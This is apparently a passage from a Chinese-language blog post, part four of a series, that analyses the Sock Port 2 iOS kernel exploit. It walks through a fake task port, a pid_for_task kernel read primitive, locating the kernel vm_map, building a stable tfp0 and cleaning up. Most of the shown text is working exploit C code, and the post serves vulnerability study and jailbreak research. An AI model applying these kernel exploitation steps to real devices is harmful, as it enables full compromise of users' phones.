<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// receive the message from fill_kalloc_with_port_pointers back, since that message contains a send right and we overwrote the pointer of the first port, we now get a send right to the fake port!</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ool_msg</span> *<span class="title">msg</span> = <span class="title">malloc</span>(0<span class="title">x1000</span>);</span></span><br><span class="line">ret = mach_msg(&amp;msg-&gt;hdr, MACH_RCV_MSG, <span class="number">0</span>, <span class="number">0x1000</span>, p, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);</span><br><span class="line"><span class="keyword">if</span> (ret) &#123;</span><br><span class="line">    <span class="built_in">free</span>(msg);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[-] mach_msg() failed: %d (%s)\n"</span>, ret, mach_error_string(ret));</span><br><span class="line">    <span class="keyword">goto</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">mach_port_t</span> *received_ports = msg-&gt;ool_ports.address;</span><br><span class="line"><span class="keyword">mach_port_t</span> our_port = received_ports[<span class="number">0</span>]; <span class="comment">// fake port!</span></span><br><span class="line"><span class="built_in">free</span>(msg);</span><br></pre></td></tr></table></figure>

<p>这里我们能拿到 fakeport 对应的 port 句柄，而不再是之前的 target port 句柄，这是因为内核在将 OOL Message 拷贝回用户空间时，会执行 <code>CAST_MACH_PORT_TO_NAME</code> 宏函数进行转换：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CAST_MACH_PORT_TO_NAME(x) ((mach_port_name_t)(uintptr_t)(x))</span></span><br></pre></td></tr></table></figure>

<p>它会截取 <code>ipc_port</code> 的头部 <code>ipc_object</code> 的 8B，即 <code>ipc_object</code> 中的前两个成员：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipc_port</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_object</span> <span class="title">ip_object</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_mqueue</span> <span class="title">ip_messages</span>;</span> </span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipc_object</span> &#123;</span></span><br><span class="line">    <span class="keyword">ipc_object_bits_t</span> io_bits; <span class="comment">// 4B</span></span><br><span class="line">    <span class="keyword">ipc_object_refs_t</span> io_references; <span class="comment">// 4B</span></span><br><span class="line">    <span class="keyword">lck_spin_t</span>	io_lock_data;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>因此最终 port 句柄实际上是由 <code>ipc_port</code> 中的 <code>io_bits</code> 和 <code>io_references</code> 的值组成的。</p>
<p>现在我们同时拥有了 <code>ipc_port</code> 的完全控制权及其句柄，但这个 <code>ipc_port</code> 缺少 <code>vm_map</code>，并不是一个合法的 task port，接下来我们需要将内核的 <code>vm_map</code> 赋予它。</p>
<h1 id="pid-for-task-Kernel-Read-Primitive"><a href="#pid-for-task-Kernel-Read-Primitive" class="headerlink" title="pid_for_task Kernel Read Primitive"></a>pid_for_task Kernel Read Primitive</h1><p><code>pid_for_task</code> 函数接收一个进程的 port 作为参数，并查询它的 pid 返回，它的实现原理如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 伪代码</span></span><br><span class="line"><span class="keyword">int</span> pid = get_ipc_port(port)-&gt;task-&gt;bsd_info-&gt;p_pid;</span><br></pre></td></tr></table></figure>
<p>而结构体成员访问的本质是偏移量计算：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> pid = *(*(*(get_ipc_port(port) + offset_task) + offset_bsd_info) + offset_pid)</span><br></pre></td></tr></table></figure>
<p>由于我们有 fakeport 的控制权，我们可以修改它的 <code>bsd_info</code> 等于 <code>addr - offset_pid</code>，此时 <code>*(*(get_ipc_port(port) + offset_task) + offset_bsd_info) = addr - offset_pid</code>，此时上述公式有如下的等价表达：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> pid = *(addr - offset_pid + offset_pid) = *addr</span><br></pre></td></tr></table></figure>
<p>通过这种方式能稳定读取 addr 处的 4B 数据，进而实现一个完美的 Kernel Read Primitive：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> kr32(addr, value)\</span></span><br><span class="line">    <span class="keyword">if</span> (SMAP) &#123;\</span><br><span class="line">        <span class="built_in">read</span>(port_fds[<span class="number">0</span>], (<span class="keyword">void</span> *)fakeport, <span class="keyword">sizeof</span>(<span class="keyword">kport_t</span>) + <span class="number">0x600</span>);\</span><br><span class="line">    &#125;\</span><br><span class="line">    *read_addr_ptr = addr - koffset(KSTRUCT_OFFSET_PROC_PID);\</span><br><span class="line">    <span class="keyword">if</span> (SMAP) &#123;\</span><br><span class="line">        <span class="built_in">write</span>(port_fds[<span class="number">1</span>], (<span class="keyword">void</span> *)fakeport, <span class="keyword">sizeof</span>(<span class="keyword">kport_t</span>) + <span class="number">0x600</span>);\</span><br><span class="line">    &#125;\</span><br><span class="line">    value = <span class="number">0x0</span>;\</span><br><span class="line">    ret = pid_for_task(our_port, (<span class="keyword">int</span> *)&amp;value);</span><br></pre></td></tr></table></figure>
<p>首先通过 Pipe Buffer 修改 <code>bsd_info</code>，然后将 fakeport 的句柄传入 <code>pid_for_task</code>，即可读取到指定地址的 4B 数据。</p>
<p>通过组合多次 kr32 可以实现任意长度数据的 Kernel Read，例如下面的 kr64：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> kr64(addr, value)\</span></span><br><span class="line">    kr32(addr + <span class="number">0x4</span>, read64_tmp);\</span><br><span class="line">    kr32(addr, value);\</span><br><span class="line">    value = value | ((<span class="keyword">uint64_t</span>)read64_tmp &lt;&lt; <span class="number">32</span>)</span><br></pre></td></tr></table></figure>

<h1 id="获取-kernel-vm-map"><a href="#获取-kernel-vm-map" class="headerlink" title="获取 kernel vm_map"></a>获取 kernel vm_map</h1><p>基于当前进程的 <code>task_port</code> 可以枚举出所有进程，在这个过程中需要数百次的 Kernel Read，因此需要借助于上述稳定的 <code>pid_for_task Kernel Read Primitive</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> struct_task;</span><br><span class="line">kr64(self_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), struct_task);</span><br><span class="line"><span class="keyword">if</span> (!struct_task) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[-] kernel read failed!\n"</span>);</span><br><span class="line">    <span class="keyword">goto</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[!] READING VIA FAKE PORT WORKED? 0x%llx\n"</span>, struct_task);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] Let's steal that kernel task port!\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// tfp0!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> kernel_vm_map = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (struct_task != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> bsd_info;</span><br><span class="line">    kr64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO), bsd_info);</span><br><span class="line">    <span class="keyword">if</span> (!bsd_info) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[-] kernel read failed!\n"</span>);</span><br><span class="line">        <span class="keyword">goto</span> err;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">uint32_t</span> pid;</span><br><span class="line">    kr32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID), pid);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">uint64_t</span> vm_map;</span><br><span class="line">        kr64(struct_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP), vm_map);</span><br><span class="line">        <span class="keyword">if</span> (!vm_map) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[-] kernel read failed!\n"</span>);</span><br><span class="line">            <span class="keyword">goto</span> err;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        kernel_vm_map = vm_map;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    kr64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV), struct_task);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于 <code>proc</code> 是一个双向链表，我们可以从当前进程开始向前枚举，直至 pid=0，再从 kernel task 中取出 <code>vm_map</code>。</p>
<h1 id="第一个-tfp0"><a href="#第一个-tfp0" class="headerlink" title="第一个 tfp0"></a>第一个 tfp0</h1><p>将上述获取到的 <code>kernel vm_map</code> 写入 fakeport，现在我们有了一个合法的 <code>kernel task port</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">read</span>(port_fds[<span class="number">0</span>], (<span class="keyword">void</span> *)fakeport, <span class="keyword">sizeof</span>(<span class="keyword">kport_t</span>) + <span class="number">0x600</span>);</span><br><span class="line">    </span><br><span class="line">fake_task-&gt;lock.data = <span class="number">0x0</span>;</span><br><span class="line">fake_task-&gt;lock.type = <span class="number">0x22</span>;</span><br><span class="line">fake_task-&gt;ref_count = <span class="number">100</span>;</span><br><span class="line">fake_task-&gt;active = <span class="number">1</span>;</span><br><span class="line">fake_task-&gt;<span class="built_in">map</span> = kernel_vm_map;</span><br><span class="line">*(<span class="keyword">uint32_t</span> *)((<span class="keyword">uint64_t</span>)fake_task + koffset(KSTRUCT_OFFSET_TASK_ITK_SELF)) = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (SMAP) &#123;</span><br><span class="line">    <span class="built_in">write</span>(port_fds[<span class="number">1</span>], (<span class="keyword">void</span> *)fakeport, <span class="keyword">sizeof</span>(<span class="keyword">kport_t</span>) + <span class="number">0x600</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此时我们应该已经拥有一个 tfp0 port，可以借助于 mach_vm 相关的内存函数予以验证。</p>
<h1 id="稳定的-tfp0"><a href="#稳定的-tfp0" class="headerlink" title="稳定的 tfp0"></a>稳定的 tfp0</h1><p>上述 tfp0 是一个偷梁换柱而来的 task port，可能会埋下一些隐患。接下来我们可以用 tfp0 去创建一个合法、稳定、安全的 tfp0：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mach_port_t</span> new_tfp0 = new_port();</span><br><span class="line"><span class="keyword">if</span> (!new_tfp0) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[-] failed to allocate new tfp0 port\n"</span>);</span><br><span class="line">    <span class="keyword">goto</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> new_addr = find_port(new_tfp0, self_port_addr);</span><br><span class="line"><span class="keyword">if</span> (!new_addr) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[-] failed to find new tfp0 port address\n"</span>);</span><br><span class="line">    <span class="keyword">goto</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> faketask = kalloc(<span class="number">0x600</span>);</span><br><span class="line"><span class="keyword">if</span> (!faketask) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[-] failed to kalloc faketask\n"</span>);</span><br><span class="line">    <span class="keyword">goto</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">kwrite(faketask, fake_task, <span class="number">0x600</span>);</span><br><span class="line">fakeport-&gt;ip_kobject = faketask;</span><br><span class="line"></span><br><span class="line">kwrite(new_addr, (<span class="keyword">const</span> <span class="keyword">void</span>*)fakeport, <span class="keyword">sizeof</span>(<span class="keyword">kport_t</span>));</span><br></pre></td></tr></table></figure>
<p>这里先创建了一个具有 send rights 的 port，然后重新创建了一个区域来容纳 kernel task，这消除了之前 <code>ipc_port</code> 与 task 在 Port Pipe Buffer 中相邻从而带来的隐患。随后将 Port Pipe Buffer 中的 task 拷贝到新分配的 task 区域，再将 fakeport 数据完整拷贝到新创建的 port，由此我们得到了一个新的 tfp0。</p>
<h1 id="环境清理"><a href="#环境清理" class="headerlink" title="环境清理"></a>环境清理</h1><p>接下来我们将先前的 tfp0 port 从进程的 port 索引表中抹去，再将已释放的 Pipe Buffer 从 fd 索引表中抹去，最后关闭 IOSurfaceClient 与 pipe，释放 userland 临时分配的缓冲区：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// clean up port</span></span><br><span class="line"><span class="keyword">uint64_t</span> task_addr = rk64(self_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));</span><br><span class="line"><span class="keyword">uint64_t</span> itk_space = rk64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));</span><br><span class="line"><span class="keyword">uint64_t</span> is_table = rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint32_t</span> port_index = our_port &gt;&gt; <span class="number">8</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> <span class="keyword">sizeof_ipc_entry_t</span> = <span class="number">0x18</span>;</span><br><span class="line"></span><br><span class="line">wk32(is_table + (port_index * <span class="keyword">sizeof_ipc_entry_t</span>) + <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">wk64(is_table + (port_index * <span class="keyword">sizeof_ipc_entry_t</span>), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">wk64(fg_data + koffset(KSTRUCT_OFFSET_PIPE_BUFFER), <span class="number">0</span>); <span class="comment">// freed already via mach_msg()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fds[<span class="number">0</span>] &gt; <span class="number">0</span>)  <span class="built_in">close</span>(fds[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">if</span> (fds[<span class="number">1</span>] &gt; <span class="number">0</span>)  <span class="built_in">close</span>(fds[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">if</span> (port_fds[<span class="number">0</span>] &gt; <span class="number">0</span>)  <span class="built_in">close</span>(port_fds[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">if</span> (port_fds[<span class="number">1</span>] &gt; <span class="number">0</span>)  <span class="built_in">close</span>(port_fds[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>((<span class="keyword">void</span> *)fakeport);</span><br><span class="line">deinit_IOSurface();</span><br></pre></td></tr></table></figure>
<p>到这里整个 Sock Port 利用就分析完了，我们拿到了稳定的 tfp0，距离 Jailbreak 又近了一步。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文梳理了 Sock Port 2 获得 tfp0 的整个过程，并对关键步骤进行了讲解，通过阅读本文能够对 Sock Port 在整体和细节上分别有深入的认识。</p>
<h1 id="下节预告"><a href="#下节预告" class="headerlink" title="下节预告"></a>下节预告</h1><p>到这里 Sock Port 漏洞解析就告一段落了，通过这个 Exploit 我们仅仅取得了 tfp0，距离 Jailbreak 还有很远的距离。接下来的文章将开始分析讲解 Undecimus Jailbreak 源码，讲解从 tfp0 到内核代码执行，再到各种 Kernel Patch。</p>
<p><img style="width: 320px;" src="https://user-gold-cdn.xitu.io/2019/8/24/16cc33a51b0a7319?w=1005&h=1164&f=png&s=197292"></img></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://en.wikipedia.org/wiki/Supervisor_Mode_Access_Prevention" target="_blank" rel="noopener">Supervisor Mode Access Prevention. Wikipedia</a></li>
<li><a href="https://www.geeksforgeeks.org/pipe-system-call/" target="_blank" rel="noopener">Pipe System Call. GeeksforGeeks</a></li>
<li><a href="https://github.com/jakeajames/sock_port" target="_blank" rel="noopener">Sock Port 2. jakeajames</a></li>
</ol>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">高级页面仔 (Soulghost)</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://blog.asm.im/2019/12/08/Sock-Port-%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%EF%BC%88%E5%9B%9B%EF%BC%89The-tfp0/">http://blog.asm.im/2019/12/08/Sock-Port-%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%EF%BC%88%E5%9B%9B%EF%BC%89The-tfp0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Sock-Port/">Sock Port</a><a class="post-meta__tags" href="/tags/UAF/">UAF</a><a class="post-meta__tags" href="/tags/tfp0/">tfp0</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2019/12/15/Undecimus-%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89Escape-from-Sandbox/"><i class="fa fa-chevron-left">  </i><span>Undecimus 分析（一）Escape from Sandbox</span></a></div><div class="next-post pull-right"><a href="/2019/12/01/Sock-Port-%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90%EF%BC%88%E4%B8%89%EF%BC%89IOSurface-Heap-Spraying/"><span>Sock Port 漏洞解析（三）IOSurface Heap Spraying</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2018 - 2020 By 高级页面仔 (Soulghost)</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="footer_custom_text"><i class="fa fa-user"> 0xfffffff007004000</i><span class="footer-separator">|</span><i class="fa fa-eye"> 0x2004000</i></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>